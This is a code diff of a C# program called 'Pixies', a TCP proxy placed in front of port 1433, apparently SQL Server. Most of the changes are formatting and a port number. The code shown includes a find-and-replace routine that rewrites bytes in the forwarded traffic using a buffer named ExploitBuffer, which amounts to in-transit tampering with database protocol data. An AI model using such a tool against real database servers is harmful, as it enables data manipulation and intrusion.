@@ -13,13 +13,12 @@ namespace Pixies
     {
         static void Main(string[] args)
         {
-
             // +----------------+
             // | Pixies Control |
             // +----------------+
 
-            String Param_Source_IP = "127.0.0.1";
-            String Param_Source_Port = "12345";          // Middle port to proxy.
+            String Param_Source_IP = "127.0.0.1";        // Pixies.
+            String Param_Source_Port = "10101";          // Pixies port to proxy.
             String Param_Destination_IP = "127.0.0.1";   // Target.
             String Param_Destination_Port = "1433";      // Target port.
 
@@ -61,7 +60,6 @@ namespace Pixies
         } // Main()
     } // class Pixies
 
-    
     public class TcpForwarderSlim
     {
         private readonly Socket MainSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
@@ -139,8 +137,7 @@ namespace Pixies
                                                             (byte) 'i', 0,
                                                             (byte) 'v', 0,
                                                             (byte) 'e', 0,
-                                                            (byte) 0x38
-                                                                   // 56 int = 0x38 hex
+                                                            (byte) 0x38 // 56 int = 0x38 hex
                                                           };
 
                         byte[] ExploitBuffer = new byte[] { (byte) 'D', 0,
@@ -148,8 +145,7 @@ namespace Pixies
                                                             (byte) 'e', 0,
                                                             (byte) 'a', 0,
                                                             (byte) 'm', 0,
-                                                            (byte) 0x10
-                                                                  // 16 int = 0x10 hex
+                                                            (byte) 0x10 // 16 int = 0x10 hex
                                                           };
 
                         ArrayReplace_ByteArray(state, FindBuffer, ExploitBuffer, 0);
@@ -193,10 +189,8 @@ namespace Pixies
             }
         } // OnDataReceive()
 
-
         static int ArrayReplace_ByteArray(State ioState, byte[] inOriginal, byte[] inReplacement, int inOffset)
         {
-
             int FoundAt = ArraySearch(ioState.Buffer, inOriginal);
             if (FoundAt >= 0 && inReplacement != null)
             {
@@ -207,14 +201,11 @@ namespace Pixies
                 Console.ForegroundColor = ConsoleColor.Cyan;
                 System.Threading.Thread.Sleep(300); 
             }
-
             return (FoundAt);
         } // ArrayReplace_ByteArray()
 
-
         static byte[] StringToByteArray(String inString)
         {
-
             byte[] Out = new byte[inString.Length * 2];
             //System.Buffer.BlockCopy(str.ToCharArray(), 0, bytes, 0, bytes.Length);
 
@@ -223,11 +214,8 @@ namespace Pixies
                 Out[n * 2] = (byte)inString[n];
                 Out[n * 2 + 1] = 0;
             }
-
             return (Out);
         } // StringToByteArray()
-
-
 
         static int ArraySearch(byte[] haystack, byte[] needle)
         {
@@ -277,8 +265,3 @@ namespace Pixies
     } //  class TcpForwarderSlim
 
 } // namespace Pixies
-
-
-
-
-
